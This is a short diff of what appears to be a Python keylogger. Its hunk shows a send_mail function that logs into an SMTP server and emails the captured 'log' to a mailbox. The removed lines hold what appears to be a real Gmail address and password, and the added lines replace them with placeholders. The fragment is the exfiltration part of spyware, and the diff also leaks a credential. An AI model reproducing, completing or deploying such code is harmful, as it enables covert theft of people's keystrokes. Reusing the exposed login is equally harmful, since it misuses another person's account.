@@ -14,8 +14,8 @@ def callback_func(key):
 def send_mail():
     email_server = smtplib.SMTP("smtp.email.com",587)
     email_server.starttls()
-    email_server.login("livealifeyouwillremember1234@gmail.com","timetodrink1234")
-    email_server.sendmail("livealifeyouwillremember1234@gmail.com","livealifeyouwillremember1234@gmail.com",log)
+    email_server.login("test@gmail.com","password")
+    email_server.sendmail("test@gmail.com","test@gmail.com",log)
     email_server.quit()
     
 def thread_func():
